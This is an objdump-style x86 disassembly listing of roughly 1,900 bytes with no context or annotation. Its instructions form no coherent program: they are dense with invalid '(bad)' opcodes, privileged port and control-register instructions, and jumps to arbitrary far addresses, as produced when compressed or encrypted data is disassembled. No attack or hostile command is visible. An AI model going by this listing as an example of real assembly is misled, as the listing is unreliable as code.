  417c9f:	and    eax,0x3c96fedb
  417ca4:	pop    ebx
  417ca5:	push   ds
  417ca6:	sub    BYTE PTR [ecx],dh
  417ca8:	xchg   esp,eax
  417ca9:	and    eax,0x449fdf3c
  417cae:	pushf  
  417caf:	(bad)  
  417cb1:	lock ror ah,0x77
  417cb5:	sub    al,0xe0
  417cb7:	ss test al,0xd7
  417cba:	ret    
  417cbb:	repz (bad) 
  417cbd:	lahf   
  417cbe:	xchg   esi,eax
  417cbf:	fild   DWORD PTR [ebx]
  417cc1:	inc    esp
  417cc2:	ret    0xb9ee
  417cc5:	pop    edi
  417cc6:	pop    ebp
  417cc7:	jecxz  0x417c80
  417cc9:	xor    al,0xb1
  417ccb:	std    
  417ccc:	inc    eax
  417ccd:	aam    0x2f
  417ccf:	mov    ds:0xc0c15295,al
  417cd4:	mov    ds:0xf7f96122,al
  417cd9:	neg    DWORD PTR ds:0x82375b7d
  417cdf:	mov    ds:0x471e239a,al
  417ce4:	xor    al,0xde
  417ce6:	sub    esi,DWORD PTR [ecx+0x6a212d1e]
  417cec:	sub    ecx,DWORD PTR gs:[ecx]
  417cef:	daa    
  417cf0:	lods   eax,DWORD PTR ds:[esi]
  417cf1:	pop    ds
  417cf2:	jns    0x417d33
  417cf4:	stos   DWORD PTR es:[edi],eax
  417cf5:	or     cx,WORD PTR [ecx+0x11ac5a3b]
  417cfc:	ins    BYTE PTR es:[edi],dx
  417cfd:	and    esi,DWORD PTR [eax]
  417cff:	ror    BYTE PTR [edi+ebp*2],cl
  417d02:	lahf   
  417d03:	jmp    0x518f9b3
  417d08:	scas   al,BYTE PTR es:[edi]
  417d09:	arpl   WORD PTR ds:0xc9d5af7f,si
  417d0f:	cmp    esi,DWORD PTR [esi]
  417d11:	sahf   
  417d12:	into   
  417d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d14:	ins    DWORD PTR es:[edi],dx
  417d15:	mov    bl,0x20
  417d17:	loope  0x417d5c
  417d19:	in     eax,0x75
  417d1b:	mov    ah,0x82
  417d1d:	iret   
  417d1e:	sub    dh,dl
  417d20:	fstp   TBYTE PTR [ebx-0x55]
  417d23:	pop    ebx
  417d24:	push   eax
  417d25:	fdiv   QWORD PTR [ecx+0x4bb6c3c2]
  417d2b:	call   0x8dcf:0x10b37ba9
  417d32:	push   eax
  417d33:	xchg   BYTE PTR [ebx+ecx*4+0x25],bh
  417d37:	lds    eax,FWORD PTR [edx]
  417d39:	xor    al,bh
  417d3b:	mov    dl,0x50
  417d3d:	mov    cl,0xf4
  417d3f:	fdiv   st(1),st
  417d41:	jno    0x417ced
  417d43:	loopne 0x417d2b
  417d45:	add    ah,BYTE PTR [ecx+0x70]
  417d48:	jbe    0x417cf9
  417d4a:	(bad)  
  417d4c:	and    ebx,edi
  417d4e:	mov    cl,bh
  417d50:	adc    al,0x4d
  417d52:	loope  0x417dbd
  417d54:	in     al,0x90
  417d56:	(bad)  
  417d57:	or     esi,DWORD PTR [esp+edi*8]
  417d5a:	test   BYTE PTR [esi],ah
  417d5c:	(bad)
  417d60:	ins    BYTE PTR es:[edi],dx
  417d61:	xchg   edi,eax
  417d62:	or     DWORD PTR [esi],ebx
  417d64:	lods   eax,DWORD PTR ds:[esi]
  417d65:	mov    ecx,0x717ef21e
  417d6a:	pop    esp
  417d6b:	aam    0xa4
  417d6d:	rcl    BYTE PTR [ecx],cl
  417d6f:	(bad)
  417d72:	add    BYTE PTR [ebp+0x24],0x38
  417d76:	cmp    esi,ecx
  417d78:	sti    
  417d79:	aas    
  417d7a:	sti    
  417d7b:	les    ecx,FWORD PTR [esi]
  417d7d:	and    edi,DWORD PTR [ebx-0x74c0a274]
  417d83:	js     0x417dfd
  417d85:	retf   0xd3e6
  417d88:	jo     0x417e04
  417d8a:	push   ecx
  417d8b:	or     ch,cl
  417d8d:	xlat   BYTE PTR ds:[ebx]
  417d8e:	mov    ah,0x21
  417d90:	pop    ecx
  417d91:	mov    bl,0xca
  417d93:	mov    al,0x1d
  417d95:	sbb    bh,BYTE PTR [ebx]
  417d97:	es in  al,0xbe
  417d9a:	sub    eax,esi
  417d9c:	pop    ds
  417d9d:	xchg   ebp,eax
  417d9e:	push   edi
  417d9f:	das    
  417da0:	jle    0x417e18
  417da2:	jp     0x417dc2
  417da4:	gs out 0x43,al
  417da7:	nop
  417da8:	jmp    0x417d2d
  417daa:	mov    cl,0x3a
  417dac:	ret    0xf276
  417daf:	jge    0x417d8b
  417db1:	pop    ss
  417db2:	inc    esp
  417db3:	mov    esi,0xce09e52f
  417db8:	out    dx,eax
  417db9:	jge    0x417dde
  417dbb:	stos   DWORD PTR es:[edi],eax
  417dbc:	add    bh,dl
  417dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dbf:	jl     0x417e15
  417dc1:	lods   eax,DWORD PTR ds:[esi]
  417dc2:	cwde   
  417dc3:	mov    edi,ecx
  417dc5:	mov    al,ds:0xd134adc9
  417dca:	lods   al,BYTE PTR ds:[esi]
  417dcb:	scas   al,BYTE PTR es:[edi]
  417dcc:	rcr    DWORD PTR [eax+0x7a2b10cb],0xf9
  417dd3:	rcr    DWORD PTR [edi-0x6147f240],cl
  417dd9:	and    DWORD PTR [eax],ebx
  417ddb:	add    edi,DWORD PTR [esi+0x2d]
  417dde:	dec    edi
  417ddf:	lods   al,BYTE PTR ds:[esi]
  417de0:	in     al,0xd8
  417de2:	sti    
  417de3:	push   ebx
  417de4:	idiv   BYTE PTR [esi+0x61e8aa1b]
  417dea:	das    
  417deb:	and    al,0xa1
  417ded:	mov    DWORD PTR [ebp+eax*2+0x6643564c],esp
  417df4:	bound  eax,QWORD PTR [esi+0x3d8e958f]
  417dfa:	push   esi
  417dfb:	xchg   edi,esp
  417dfd:	inc    BYTE PTR [esi+0x10]
  417e00:	fdiv   DWORD PTR [esi]
  417e02:	out    0xee,al
  417e04:	cli    
  417e05:	iret   
  417e06:	jbe    0x417e02
  417e08:	add    cl,bl
  417e0a:	push   ebp
  417e0b:	iret   
  417e0c:	sub    eax,0xbdd9fbe
  417e11:	mov    edx,0xf8863eb5
  417e16:	sti    
  417e17:	dec    edx
  417e18:	out    0x38,eax
  417e1a:	inc    ebx
  417e1b:	ret    
  417e1c:	xor    al,0x83
  417e1e:	call   0x5893:0x8edcb64e
  417e25:	mov    esp,fs
  417e27:	fstp   QWORD PTR [esi-0xed3acac]
  417e2d:	push   ebp
  417e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e2f:	adc    eax,0x8e8934c3
  417e34:	fidiv  WORD PTR [esi+0x17]
  417e37:	jae    0x417e41
  417e39:	dec    eax
  417e3a:	or     eax,0x6d25e51d
  417e3f:	cmp    BYTE PTR [esi],cl
  417e41:	inc    eax
  417e42:	inc    esp
  417e43:	add    al,0x4e
  417e45:	cld    
  417e46:	jmp    0x417e60
  417e48:	inc    edx
  417e49:	or     BYTE PTR [ecx],al
  417e4b:	or     edx,edx
  417e4d:	mov    dl,0xf0
  417e4f:	jbe    0x417eb4
  417e51:	aad    0x15
  417e53:	mov    ss,WORD PTR [ebx+0x61]
  417e56:	dec    esi
  417e57:	shr    DWORD PTR [esi+0x51],1
  417e5a:	jno    0x417e95
  417e5c:	int    0xf1
  417e5e:	or     dl,ch
  417e60:	jmp    0x417e18
  417e62:	dec    edi
  417e63:	cmp    bh,ah
  417e65:	out    dx,al
  417e66:	sub    ecx,DWORD PTR [esi+0x11]
  417e69:	mov    cr1,eax
  417e6c:	cmc    
  417e6d:	inc    edx
  417e6e:	add    al,0xd5
  417e70:	push   0xffffff91
  417e72:	sti    
  417e73:	clc    
  417e74:	cld    
  417e75:	fmul   st,st(2)
  417e77:	sub    al,0x17
  417e79:	xchg   DWORD PTR [ebx-0x1c9f3d9e],ebp
  417e7f:	jle    0x417ef1
  417e81:	shr    DWORD PTR [esi-0x9],1
  417e84:	neg    BYTE PTR [edi+0x58]
  417e87:	dec    edx
  417e88:	sbb    al,0x11
  417e8a:	push   0xe
  417e8c:	push   es
  417e8d:	inc    ebp
  417e8e:	push   edi
  417e8f:	adc    DWORD PTR [ecx+0x674e0045],esi
  417e95:	mov    BYTE PTR ss:[edx],dh
  417e98:	les    esi,FWORD PTR [ebp+0x71]
  417e9b:	xchg   esp,eax
  417e9c:	nop
  417e9d:	sub    DWORD PTR [edi+eiz*8+0x45346ba],eax
  417ea4:	dec    esp
  417ea5:	and    edi,ebx
  417ea7:	xor    DWORD PTR [edi],ecx
  417ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eaa:	int3   
  417eab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ead:	pop    esi
  417eae:	std    
  417eaf:	not    bl
  417eb1:	in     eax,0x33
  417eb3:	push   cs
  417eb4:	or     eax,0x622b567b
  417eb9:	and    ch,bh
  417ebb:	sub    DWORD PTR [ecx-0x69],esp
  417ebe:	(bad)  
  417ebf:	or     DWORD PTR [ebp-0x7ac410e2],0x51ad2a3c
  417ec9:	lahf   
  417eca:	lea    edx,[edi+esi*2-0x5cd5889b]
  417ed1:	dec    ecx
  417ed2:	data16 rol BYTE PTR ds:0xf4377f79,0x5
  417eda:	sub    al,dl
  417edc:	and    eax,0x915a46f6
  417ee1:	xchg   BYTE PTR [eax+0x59],ah
  417ee4:	push   ebp
  417ee5:	(bad)  
  417ee6:	popa   
  417ee7:	mov    WORD PTR [edx],ds
  417ee9:	out    dx,al
  417eea:	adc    ch,ah
  417eec:	out    dx,al
  417eed:	ds aad 0xad
  417ef0:	stc    
  417ef1:	add    eax,0x49667811
  417ef6:	add    edx,edi
  417ef8:	jmp    0x417f5f
  417efa:	loopne 0x417e86
  417efc:	push   esi
  417efd:	mov    bl,0xac
  417eff:	jb     0x417ed3
  417f01:	out    dx,al
  417f02:	js     0x417f10
  417f04:	jae    0x417e97
  417f06:	ja     0x417f4d
  417f08:	xlat   BYTE PTR ds:[ebx]
  417f09:	lds    esi,FWORD PTR [eax-0x44e89d4b]
  417f0f:	fidivr WORD PTR [eax-0x12fb2a8d]
  417f15:	push   dx
  417f17:	(bad)  
  417f18:	lock cdq 
  417f1a:	mov    esp,0xf3784224
  417f1f:	bound  eax,QWORD PTR [edx]
  417f21:	sbb    edi,esp
  417f23:	pop    ss
  417f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f25:	adc    BYTE PTR [esi],bl
  417f27:	jl     0x417eb9
  417f29:	loopne 0x417f3c
  417f2b:	sub    edi,edx
  417f2d:	sub    bl,cl
  417f2f:	in     eax,dx
  417f30:	xchg   ebp,eax
  417f31:	imul   ebp,DWORD PTR [esp+0x5c],0xb
  417f36:	stc    
  417f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f38:	push   esp
  417f39:	out    0xac,eax
  417f3b:	(bad)  
  417f3c:	xchg   ebp,eax
  417f3d:	mov    bh,BYTE PTR [edx]
  417f3f:	shl    DWORD PTR [ecx],cl
  417f41:	mov    al,0x29
  417f43:	and    ebp,DWORD PTR [edx]
  417f45:	fsub   st,st(0)
  417f47:	aad    0x39
  417f49:	fwait
  417f4a:	jns    0x417f5f
  417f4c:	inc    ebp
  417f4d:	dec    ecx
  417f4e:	stos   BYTE PTR es:[edi],al
  417f4f:	shl    DWORD PTR [eax+ecx*2],1
  417f52:	call   0x8437d3a3
  417f57:	jle    0x417ee3
  417f59:	xchg   edi,eax
  417f5a:	push   0x52
  417f5c:	add    ecx,edi
  417f5e:	jl     0x417f0b
  417f60:	test   al,0x1f
  417f62:	mov    dh,0xf9
  417f64:	xor    al,0x31
  417f66:	adc    ch,BYTE PTR [ebx-0x186f2450]
  417f6c:	lock or DWORD PTR ds:0xcca354e9,0xffffffda
  417f74:	call   FWORD PTR [ebx]
  417f76:	mov    dh,ah
  417f78:	push   ds
  417f79:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  417f7b:	jl     0x417f23
  417f7d:	or     edi,DWORD PTR [esi]
  417f7f:	fsub   DWORD PTR [ebp-0x67]
  417f82:	and    al,BYTE PTR [ebx-0x25e4c130]
  417f88:	aam    0xe3
  417f8a:	mov    ah,BYTE PTR [ebx+ecx*4]
  417f8d:	sbb    al,0x1b
  417f8f:	lahf   
  417f90:	xchg   esi,eax
  417f91:	sub    BYTE PTR [ebp+0x3fb4de6d],bh
  417f97:	nop
  417f98:	cmp    DWORD PTR [ebp-0x6a],esi
  417f9b:	mov    ds:0x93a2684a,eax
  417fa0:	ja     0x417fb6
  417fa2:	add    al,0x70
  417fa5:	pop    ss
  417fa6:	adc    BYTE PTR ds:0x692d8628,dh
  417fac:	pop    esp
  417fad:	xchg   BYTE PTR [ebp-0x510b3ebd],ah
  417fb3:	pop    esi
  417fb4:	push   ebx
  417fb5:	cmp    ch,ch
  417fb7:	addr16 cmp eax,0x4ea749d2
  417fbd:	lds    ebx,FWORD PTR [esp+ecx*2-0x1ebec8aa]
  417fc4:	xor    eax,0xf33416aa
  417fc9:	call   0x6e4f:0x3cb336ff
  417fd0:	mov    dh,0x73
  417fd2:	push   eax
  417fd3:	fs pushf 
  417fd5:	sub    al,0x74
  417fd7:	push   ds
  417fd8:	pop    edx
  417fd9:	shl    BYTE PTR [ebx+eax*2+0x5e],cl
  417fdd:	arpl   cx,dx
  417fdf:	dec    ecx
  417fe0:	sub    BYTE PTR ds:0xbfb690db,dh
  417fe6:	pop    es
  417fe7:	inc    ebx
  417fe8:	xchg   edx,eax
  417fe9:	stos   BYTE PTR es:[edi],al
  417fea:	pop    edi
  417feb:	inc    esp
  417fec:	cld    
  417fed:	ret    
  417fee:	hlt    
  417fef:	in     al,0xab
  417ff1:	push   esi
  417ff2:	jp     0x418066
  417ff4:	(bad)  
  417ff5:	and    DWORD PTR [ebx+0x3d13a196],edx
  417ffb:	push   0x1f25f070
  418000:	test   BYTE PTR [edx],0x79
  418003:	shl    DWORD PTR [edx],cl
  418005:	cmp    al,0xd9
  418007:	sub    al,0x5c
  418009:	cmp    eax,0x7d72ea10
  41800e:	ds cld 
  418010:	xor    bh,BYTE PTR [ebx]
  418012:	jnp    0x418071
  418014:	and    al,0xd9
  418016:	xor    dh,BYTE PTR [eax-0x51]
  418019:	enter  0xaca9,0x92
  41801d:	in     al,dx
  41801e:	jl     0x41809d
  418020:	dec    edx
  418021:	fwait
  418022:	iret   
  418023:	mov    esp,0xaf590ce1
  418028:	pushf  
  418029:	xchg   DWORD PTR [edx+ebx*2],esp
  41802c:	push   ds
  41802d:	loopne 0x417fc5
  41802f:	sub    al,0xe6
  418031:	ins    BYTE PTR es:[edi],dx
  418032:	mov    ecx,0xa2759225
  418037:	adc    DWORD PTR [edx-0x36],esp
  41803a:	test   eax,0xe40de211
  41803f:	push   eax
  418040:	adc    ebx,edi
  418042:	dec    esp
  418043:	aaa    
  418044:	adc    esi,DWORD PTR [eax]
  418046:	xchg   esi,eax
  418047:	sahf   
  418048:	inc    edi
  418049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41804a:	xlat   BYTE PTR ds:[ebx]
  41804b:	paddusw mm2,QWORD PTR [ebp-0x3b]
  41804f:	or     al,0xa
  418051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418052:	rol    edi,cl
  418054:	cmp    ecx,DWORD PTR [eax+0x35]
  418057:	psubsw mm4,QWORD PTR [edx+0x27]
  41805b:	aam    0x3a
  41805d:	addr16 jmp 0x28287cd0
  418063:	inc    edx
  418064:	jmp    0x6e4bd500
  418069:	daa    
  41806a:	mov    esi,0x6a55f51
  41806f:	mov    eax,0x211738c0
  418074:	pop    esi
  418075:	dec    ebp
  418076:	adc    BYTE PTR [ecx],dh
  418078:	jl     0x418088
  41807a:	in     eax,dx
  41807b:	sahf   
  41807c:	retf   
  41807d:	ja     0x41807f
  41807f:	mov    eax,ds:0xd234a96
  418084:	ret    
  418085:	push   ebp
  418086:	push   ecx
  418087:	in     al,0x63
  418089:	not    bh
  41808b:	outs   dx,BYTE PTR ds:[esi]
  41808c:	lods   eax,DWORD PTR ds:[esi]
  41808d:	xchg   sp,ax
  41808f:	xchg   ecx,eax
  418090:	fs xchg esi,eax
  418092:	retf   0x5e7d
  418095:	mov    ds,WORD PTR [edx-0x24]
  418098:	vaddss xmm7,xmm3,DWORD PTR ds:0xcabda7d4
  4180a0:	push   es
  4180a1:	cmc    
  4180a2:	pop    esi
  4180a3:	mov    edx,0x702d2905
  4180a8:	imul   ebx,DWORD PTR [ebp+0x53],0x52
  4180ac:	jo     0x4180a5
  4180ae:	mov    ds:0x31107256,al
  4180b3:	jno    0x418079
  4180b5:	rcl    DWORD PTR [esp+ecx*4],cl
  4180b8:	mov    ch,BYTE PTR [edx+0x5b]
  4180bb:	retf   0xdc3d
  4180be:	les    ebx,FWORD PTR [edi]
  4180c0:	inc    esi
  4180c1:	cs xchg ebx,eax
  4180c3:	stos   DWORD PTR es:[edi],eax
  4180c4:	add    BYTE PTR [edi],ah
  4180c6:	les    ebp,FWORD PTR [esi+0x61020b8]
  4180cc:	pop    ds
  4180cd:	es inc edx
  4180cf:	cs or  dh,0xd0
  4180d3:	aad    0x23
  4180d5:	pop    edi
  4180d6:	cs fmulp st(7),st
  4180d9:	or     eax,0x45bd2191
  4180de:	sbb    ecx,DWORD PTR ds:[ebx-0x3376c790]
  4180e5:	jmp    0x6b17:0xefbaee1c
  4180ec:	lods   eax,DWORD PTR ds:[esi]
  4180ed:	inc    ecx
  4180ee:	repz mov cl,0xa4
  4180f1:	sbb    dh,BYTE PTR [edx+esi*1]
  4180f4:	leave  
  4180f5:	gs test eax,0x34c6a7c6
  4180fb:	ror    DWORD PTR [eax-0xe],0xb3
  4180ff:	push   0x5d
  418101:	and    edx,edx
  418103:	sub    edx,DWORD PTR [ebp+0x1d]
  418106:	inc    esp
  418107:	cmp    al,0xe5
  418109:	add    bl,BYTE PTR [edx+edx*2]
  41810c:	sahf   
  41810d:	inc    eax
  41810e:	push   ds
  41810f:	je     0x418133
  418111:	sar    BYTE PTR [ebx+0x55],0x8d
  418115:	mov    al,ds:0x4eab4697
  41811a:	mov    ds,WORD PTR [ebx-0x6f]
  41811d:	stos   DWORD PTR es:[edi],eax
  41811e:	inc    edi
  41811f:	in     eax,dx
  418120:	xor    esi,ecx
  418122:	mov    bl,0x50
  418124:	mov    bh,ah
  418126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418127:	pop    eax
  418128:	out    dx,eax
  418129:	mov    edi,0x4e393e62
  41812e:	sub    eax,0x87834728
  418133:	pop    ecx
  418134:	jmp    0xbe89abb7
  418139:	adc    eax,0x85583c41
  41813e:	and    DWORD PTR [edi+0x2e],ecx
  418141:	mov    ebx,0x30cdf265
  418146:	xchg   DWORD PTR [esi-0x44],esp
  418149:	cwde   
  41814a:	mov    ch,0x1f
  41814c:	adc    ebx,DWORD PTR [esi+edx*8+0x40]
  418150:	lea    ebp,[ebp+0x7bbe1dd6]
  418156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418157:	dec    eax
  418158:	mov    eax,0x9d515ad9
  41815d:	mov    ebx,0x932a59b9
  418162:	xor    BYTE PTR [edi],cl
  418164:	pop    esi
  418165:	imul   ebp,DWORD PTR [ecx],0xa8db7a5f
  41816b:	test   BYTE PTR [esi+0x47],ch
  41816e:	and    BYTE PTR [edi],0xfd
  418171:	mov    ecx,0x2f76451b
  418176:	cmc    
  418177:	push   DWORD PTR [edi-0x7]
  41817a:	leave  
  41817b:	push   ds
  41817c:	cli    
  41817d:	pop    es
  41817e:	push   ebx
  41817f:	mov    WORD PTR [edi],ds
  418181:	popf   
  418182:	rcl    DWORD PTR [esi+eax*1],0xa5
  418186:	push   es
  418187:	push   edx
  418188:	adc    cl,al
  41818a:	jp     0x418185
  41818c:	ret    0x99a
  41818f:	(bad)
  418192:	mov    ecx,0xdf00aa97
  418197:	sub    eax,0x9ba158ba
  41819c:	or     ebx,esi
  41819e:	iret   
  41819f:	mov    WORD PTR [ecx+0x62],?
  4181a2:	mov    ebx,0x99a77d2f
  4181a7:	(bad)  
  4181a8:	call   0x1243b424
  4181ad:	dec    ebp
  4181ae:	xor    al,0xc1
  4181b0:	sub    al,BYTE PTR [eax-0x4e811b55]
  4181b6:	rcr    BYTE PTR [esp+ecx*8],1
  4181b9:	sti    
  4181ba:	pop    edx
  4181bb:	mov    dh,0xef
  4181bd:	mov    ebx,0x98faa46b
  4181c2:	xchg   edi,eax
  4181c3:	xchg   BYTE PTR [ebx-0x69fd8f62],cl
  4181c9:	or     bl,dh
  4181cb:	fimul  WORD PTR [edi+0x1ee708c2]
  4181d1:	repnz cmp ebp,DWORD PTR [edi]
  4181d4:	mov    edx,0xb5ea5d4c
  4181d9:	pop    ds
  4181da:	dec    edx
  4181db:	mov    ds:0x57deb81b,eax
  4181e0:	sbb    dh,BYTE PTR [esi+0x7d]
  4181e3:	in     eax,0xa2
  4181e5:	cmc    
  4181e6:	cmp    edi,DWORD PTR [edx+0x16]
  4181e9:	ffree  st(3)
  4181eb:	and    bl,BYTE PTR [ecx]
  4181ed:	mov    cs,WORD PTR [esi+0x66]
  4181f0:	aad    0x8d
  4181f2:	jle    0x418273
  4181f4:	fld    QWORD PTR [ebp+0x40]
  4181f7:	cli    
  4181f8:	xor    BYTE PTR [ebp-0x58],0x68
  4181fc:	pop    esi
  4181fd:	sbb    al,0xe0
  4181ff:	cmp    cl,bl
  418201:	dec    esp
  418202:	jp     0x4181f5
  418204:	push   ecx
  418205:	lock adc dh,BYTE PTR [ebp-0xd]
  418209:	cmp    ecx,eax
  41820b:	lock mov bh,BYTE PTR [ecx+esi*4-0x1f]
  418210:	ins    DWORD PTR es:[edi],dx
  418211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418212:	loop   0x418235
  418214:	leave  
  418215:	mov    ebx,0xb5ab8031
  41821a:	out    0xe3,eax
  41821c:	out    dx,al
  41821d:	loop   0x4181af
  41821f:	aam    0x1e
  418221:	stos   DWORD PTR es:[edi],eax
  418222:	retf   0x8db7
  418225:	jno    0x4181d3
  418227:	fbld   TBYTE PTR [ecx]
  418229:	pop    edi
  41822a:	and    eax,0x7784b8f4
  41822f:	push   esi
  418230:	stc    
  418231:	adc    eax,0x6cf42e4b
  418236:	fiadd  WORD PTR [eax]
  418238:	push   ds
  418239:	push   ss
  41823a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41823b:	call   0xaa2cefb5
  418240:	dec    eax
  418241:	clc    
  418242:	add    eax,0x81f9943
  418247:	pop    esi
  418248:	mov    WORD PTR [ecx],es
  41824a:	loope  0x418277
  41824c:	(bad)  
  41824e:	dec    esi
  41824f:	retf   0x6e12
  418252:	xchg   BYTE PTR ds:0xc06c91a2,al
  418258:	out    0xa1,eax
  41825a:	xor    al,0xb9
  41825c:	pop    ss
  41825d:	xor    edx,edx
  41825f:	cwde   
  418260:	cmp    ch,BYTE PTR ss:[ecx+0x7dbba577]
  418267:	jle    0x41821b
  418269:	daa    
  41826a:	fwait
  41826b:	sub    al,0x98
  41826d:	lods   al,BYTE PTR ds:[esi]
  41826e:	jmp    0x967:0x51143ff5
  418275:	xchg   edx,eax
  418276:	adc    al,0x64
  418278:	inc    edi
  418279:	dec    edx
  41827a:	jp     0x4182b0
  41827c:	popf   
  41827d:	int3   
  41827e:	lock jo 0x41827e
  418281:	add    al,0x9
  418283:	xchg   ebx,eax
  418284:	sti    
  418285:	mov    ebp,DWORD PTR [esi-0x3c0b316b]
  41828b:	fadd   st,st(2)
  41828d:	mov    ebx,0x5b4c411b
  418292:	xor    eax,0xef64fa2e
  418297:	push   ss
  418298:	pmulhw mm2,QWORD PTR [esi+0x6c]
  41829c:	or     BYTE PTR [ebx-0x52],al
  41829f:	sbb    edi,0xffffff8f
  4182a2:	push   ss
  4182a3:	popa   
  4182a4:	sbb    esp,DWORD PTR [ebp+0x6423c04]
  4182aa:	or     al,0xb3
  4182ac:	daa    
  4182ad:	mov    eax,0x6d553e2f
  4182b2:	mov    dl,0xa1
  4182b4:	fdivr  DWORD PTR [ebx]
  4182b6:	cmp    DWORD PTR es:[ebp+0x11f99f19],ebx
  4182bd:	mov    ebx,0xf043cb25
  4182c2:	ror    DWORD PTR [ebx],cl
  4182c4:	into   
  4182c5:	mov    eax,DWORD PTR [esp+ecx*1+0x6b]
  4182c9:	jns    0x41826d
  4182cb:	outs   dx,DWORD PTR ds:[esi]
  4182cc:	mov    fs,WORD PTR [ebp+0x41]
  4182cf:	icebp  
  4182d0:	or     eax,0xaf93640f
  4182d5:	and    eax,0xae3e37df
  4182da:	sub    al,dh
  4182dc:	push   eax
  4182dd:	push   ecx
  4182de:	in     eax,dx
  4182df:	add    eax,0x5ebe7582
  4182e4:	mov    dl,0x9a
  4182e6:	add    al,0xb5
  4182e8:	sbb    BYTE PTR [ecx-0x17731b1f],dh
  4182ee:	scas   eax,DWORD PTR es:[edi]
  4182ef:	add    al,0x45
  4182f1:	ins    DWORD PTR es:[edi],dx
  4182f2:	sbb    al,0x9
  4182f4:	mov    dh,0xb6
  4182f6:	xchg   cl,dh
  4182f8:	sbb    ecx,DWORD PTR [ecx]
  4182fa:	add    ebx,DWORD PTR [esi+eiz*8]
  4182fd:	mov    ds:0x93abfe4a,al
  418302:	and    DWORD PTR [ebx],0xcebce6f2
  418308:	push   ecx
  418309:	jno    0x41833e
  41830b:	mov    ecx,fs
  41830d:	pop    ss
  41830e:	sub    dl,0xe8
  418311:	and    BYTE PTR [ebx-0x76efe097],al
  418317:	xchg   BYTE PTR [ecx],ah
  418319:	nop
  41831a:	xchg   ecx,eax
  41831b:	sbb    edi,DWORD PTR [edx-0x3c]
  41831e:	clc    
  41831f:	pop    edx
  418320:	sub    eax,0x424a9a46
  418325:	inc    ecx
  418326:	fwait
  418327:	stos   DWORD PTR es:[edi],eax
  418328:	pop    ds
  418329:	xor    DWORD PTR [eax-0x6884b437],0x6aa4b549
  418333:	inc    ecx
  418334:	dec    esp
  418335:	retf   0xc471
  418338:	std    
  418339:	cmp    ecx,DWORD PTR [esi+0x6a227a70]
  41833f:	add    DWORD PTR [esi+0x244c3131],eax
  418345:	fld    DWORD PTR [ecx-0x6c]
  418348:	mov    al,ds:0x6a8f9e75
  41834d:	out    0x6f,al
  41834f:	sahf   
  418350:	ret    
  418351:	xchg   ecx,eax
  418352:	ds (bad) 
  418354:	scas   eax,DWORD PTR es:[edi]
  418355:	in     al,dx
  418356:	fwait
  418357:	push   edi
  418358:	and    DWORD PTR ds:0x74bcd402,esi
  41835e:	cmp    eax,0xde3b9082
  418363:	push   edi
  418364:	addr16 push ebx
  418366:	jnp    0x418313
  418368:	clc    
  418369:	pop    ds
  41836a:	lock fldcw WORD PTR [edi-0x4d]
  41836e:	ret    0x7834
  418371:	sbb    ebp,DWORD PTR [ebx+0x69]
  418374:	cdq    
  418375:	shl    BYTE PTR [esi],0xe8
  418378:	add    DWORD PTR ds:[esi+0x616cd60b],ecx
  41837f:	add    bh,BYTE PTR [eax]
  418381:	jmp    0x28115ff0
  418386:	sub    cl,BYTE PTR [esp+edi*4]
  418389:	(bad)  
  41838a:	push   ecx
  41838b:	mov    dl,0x5e
  41838d:	out    0xfa,eax
  41838f:	xchg   ebp,eax
  418390:	jl     0x418345
  418392:	lods   al,BYTE PTR ds:[esi]
  418393:	cmp    ecx,DWORD PTR ds:0x9bfea734
  418399:	mov    ebx,ecx
  41839b:	xor    DWORD PTR [edi+0x2b3eae9d],eax
  4183a1:	scas   ax,WORD PTR es:[di]
  4183a4:	inc    eax
  4183a5:	add    al,0xab
  4183a7:	rol    BYTE PTR [edx],cl
  4183a9:	ret    0xdf0f
  4183ac:	and    al,BYTE PTR [edi+0x64b2b4d1]
  4183b2:	test   DWORD PTR [eax+0x91018b7],eax
  4183b8:	shl    DWORD PTR [eax+0x21],cl
  4183bb:	shl    bl,1
  4183bd:	mov    dl,0x5f
  4183bf:	jmp    0xf4e5:0xe819c58d
  4183c6:	fiadd  DWORD PTR [eax]
  4183c8:	adc    al,bl
  4183ca:	ret    
  4183cb:	int3   
  4183cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183cd:	ins    BYTE PTR es:[edi],dx
  4183ce:	(bad)  
  4183cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183d0:	xchg   BYTE PTR [ecx+0x301b7d58],dh
  4183d6:	loop   0x4183cb
  4183d8:	outs   dx,DWORD PTR ds:[esi]
  4183d9:	adc    DWORD PTR [ebx+0x21239457],edx
  4183df:	sub    DWORD PTR [edi+0x559f742a],ebx
  4183e5:	or     BYTE PTR [ecx],dl
  4183e7:	add    eax,0xf8f26099
  4183ec:	cli    
  4183ed:	idiv   dh
  4183ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183f0:	repnz adc DWORD PTR [ebp+0x4],esp
  4183f4:	dec    ecx
  4183f5:	push   0x896c590a
  4183fa:	loop   0x418393
  4183fc:	pop    esi
  4183fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183fe:	dec    ebp
  4183ff:	dec    edi
  418400:	mov    eax,ds:0x8caf3a98
  418405:	icebp  
  418406:	mov    esi,edx
  418408:	push   es
  418409:	jp     0x418398
  41840b:	mov    ebx,es
  41840d:	stos   DWORD PTR es:[edi],eax
  41840e:	(bad)  
  41840f:	cmp    DWORD PTR [esi],edx
  418411:	into   
  418412:	jbe    0x418488
  418414:	inc    ebx
  418415:	xchg   eax,ecx
  418417:	idiv   BYTE PTR [eax+eax*2]
  41841a:	dec    edx
  41841b:	jg     0x418481
